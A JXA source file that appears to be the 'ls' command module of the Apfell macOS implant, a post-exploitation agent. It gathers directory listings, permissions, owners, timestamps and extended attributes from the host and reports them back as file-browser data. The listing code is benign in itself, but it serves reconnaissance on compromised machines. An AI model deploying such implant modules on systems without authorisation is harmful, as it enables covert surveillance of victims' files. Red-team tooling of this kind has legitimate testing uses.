exports.ls = function(task, command, params){
    ObjC.import('Foundation');
    let includeAttributes = false;
    let output = {};
    try {
        let command_params = JSON.parse(params);
        if(command_params["includeAttributes"]){
            includeAttributes = command_params["includeAttributes"];
        }
        let fileManager = $.NSFileManager.defaultManager;
        let error = Ref();
        let path = command_params['path'];
        if (path === "" || path === ".") {
            path = fileManager.currentDirectoryPath.js;
            if (path === undefined || path === "") {
                return {
                    "user_output": "Failed to get current working directory",
                    "completed": true,
                    "status": "error"
                };
            }
        }
        if (path[0] === '"' || path[0] === "'") {
            path = path.substring(1, path.length - 1);
        }
        if(path[0] === '~'){
            path = $(path).stringByExpandingTildeInPath.js;
        }
        output['host'] = ObjC.unwrap(apfell.procInfo.hostName);
        output['update_deleted'] = true;
        let attributes = undefined;
        let time_attributes = undefined;
        let isDirectory = Ref();
        let exists = fileManager.fileExistsAtPathIsDirectory($(path), isDirectory);
        if (exists) {
            output['is_file'] = !isDirectory[0];
        } else {
            return {
                "user_output": path + " does not exist or is not accessible in the current context",
                "completed": true,
                "status": "error"
            };
        }
        if(includeAttributes){
            attributes = ObjC.deepUnwrap(fileManager.attributesOfItemAtPathError($(path), error));
            time_attributes = ObjC.unwrap(fileManager.attributesOfItemAtPathError($(path), error));
        }
        output["success"] = true;
        output['files'] = [];
        if (isDirectory[0]) {
            let error = Ref();
            let files = ObjC.deepUnwrap(fileManager.contentsOfDirectoryAtPathError($(path), error));
            if (files !== undefined) {
                let files_data = [];
                output['success'] = true;
                let sub_files = files;
                if (path[path.length - 1] !== "/") {
                    path = path + "/";
                }
                for (let i = 0; i < sub_files.length; i++) {
                    let attr = undefined;
                    let time_attr = undefined;
                    if (includeAttributes) {
                        attr = ObjC.deepUnwrap(fileManager.attributesOfItemAtPathError($(path + sub_files[i]), error));
                        time_attr = ObjC.unwrap(fileManager.attributesOfItemAtPathError($(path + sub_files[i]), error));
                    }
                    let file_add = {};
                    file_add['name'] = sub_files[i];
                    if (includeAttributes) {
                        let plistPerms = ObjC.unwrap(fileManager.attributesOfItemAtPathError($(path + sub_files[i]), $()));
                        if (plistPerms !== undefined && plistPerms['NSFileExtendedAttributes'] !== undefined) {
                            let extended = {};
                            let perms = plistPerms['NSFileExtendedAttributes'].js;
                            for (let j in perms) {
                                extended[j] = perms[j].base64EncodedStringWithOptions(0).js;
                            }
                            file_add['permissions'] = extended;
                        } else {
                            file_add['permissions'] = {};
                        }
                    } else {
                        file_add['permissions'] = {};
                    }
                    let exists = fileManager.fileExistsAtPathIsDirectory($(path + sub_files[i]), isDirectory);
                    if (exists) {
                        file_add['is_file'] = !isDirectory[0];
                    }
                    file_add['size'] = 0;
                    if (attr !== undefined) {
                        file_add['size'] = attr['NSFileSize'];
                        let nsposix = attr['NSFilePosixPermissions'];
                        // we need to fix this mess to actually be real permission bits that make sense
                        file_add['permissions']['posix'] = ((nsposix >> 6) & 0x7).toString() + ((nsposix >> 3) & 0x7).toString() + (nsposix & 0x7).toString();
                        file_add['permissions']['owner'] = attr['NSFileOwnerAccountName'] + "(" + attr['NSFileOwnerAccountID'] + ")";
                        file_add['permissions']['group'] = attr['NSFileGroupOwnerAccountName'] + "(" + attr['NSFileGroupOwnerAccountID'] + ")";
                        file_add['permissions']['hidden'] = attr['NSFileExtensionAttribute'] === true;
                        file_add['permissions']['create_time'] = Math.floor(Math.trunc(time_attr['NSFileCreationDate']?.timeIntervalSince1970 * 1000 || 0));
                        if (file_add['permissions']['create_time'] < 0) {
                            file_add['permissions']['create_time'] = 0;
                        }
                        file_add['modify_time'] = Math.floor(Math.trunc(time_attr['NSFileModificationDate']?.timeIntervalSince1970 * 1000 || 0));
                        if (file_add['modify_time'] < 0) {
                            file_add['modify_time'] = 0;
                        }
                        file_add['access_time'] = 0;
                    } else {

                    }
                    files_data.push(file_add);
                }
                output['files'] = files_data;
            } else {
                output['success'] = false;
            }
        }
        let nsposix = attributes ? attributes['NSFilePosixPermissions'] : "";
        let components =  ObjC.deepUnwrap( fileManager.componentsToDisplayForPath(path) ).slice(1);
        if( components.length > 0 && components[0] === "Macintosh HD"){
            components.pop();
        }
        // say components = "etc, krb5.keytab"
        // check all components to see if they're symlinks
        let parent_path = "/";
        for(let p = 0; p < components.length; p++){
            let resolvedSymLink = fileManager.destinationOfSymbolicLinkAtPathError( $( parent_path + components[p] ), $.nil ).js;
            if(resolvedSymLink){
                parent_path = parent_path + resolvedSymLink + "/";
            }else{
                parent_path = parent_path + components[p] + "/";
            }
        }
        output['name'] = fileManager.displayNameAtPath(parent_path).js;
        output['parent_path'] = parent_path.slice(0, -(output["name"].length + 1));
        if(output['name'] === "Macintosh HD"){output['name'] = "/";}
        if(output['name'] === output['parent_path']){output['parent_path'] = "";}
        if(command_params['path'] === "/dev"){
            // /dev is apparently a special case for some reason and doesn't follow the normal fileManager.componentsToDisplayForPath
            output["name"] = "dev";
            output["parent_path"] = "/";
        }
        output['size'] = attributes ? attributes['NSFileSize'] : 0;
        output['access_time'] = 0;
        output['modify_time'] = time_attributes ? Math.floor(Math.trunc(time_attributes['NSFileModificationDate'].timeIntervalSince1970 * 1000)): 0;
        if(output["modify_time"] < 0){
            output["modify_time"] = 0;
        }
        if(attributes && attributes['NSFileExtendedAttributes'] !== undefined){
            let extended = {};
            let perms = attributes['NSFileExtendedAttributes'].js;
            for(let j in perms){
                extended[j] = perms[j].base64EncodedStringWithOptions(0).js;
            }
            output['permissions'] = extended;
        }else{
            output['permissions'] = {};
        }
        output['permissions']['create_time'] = time_attributes ? Math.floor(Math.trunc(time_attributes['NSFileCreationDate'].timeIntervalSince1970 * 1000)): 0;
        if(output['permissions']['create_time'] < 0){
            output['permissions']['create_time'] = 0;
        }
        if(includeAttributes) {
            output['permissions']['posix'] = ((nsposix >> 6) & 0x7).toString() + ((nsposix >> 3) & 0x7).toString() + (nsposix & 0x7).toString();
            output['permissions']['owner'] = attributes['NSFileOwnerAccountName'] + "(" + attributes['NSFileOwnerAccountID'] + ")";
            output['permissions']['group'] = attributes['NSFileGroupOwnerAccountName'] + "(" + attributes['NSFileGroupOwnerAccountID'] + ")";
            output['permissions']['hidden'] = attributes['NSFileExtensionHidden'] === true;
        }
        if(command_params['file_browser']){
            return {"file_browser": output, "completed": true, "user_output": "added data to file browser"};
        }else{
            return {"file_browser": output, "completed": true, "user_output": JSON.stringify(output, null, 6)};
        }
    }catch(error){
        return {
            "user_output": "Error: " + error.toString(),
            "completed": true,
            "status": "error"
        };
    }
};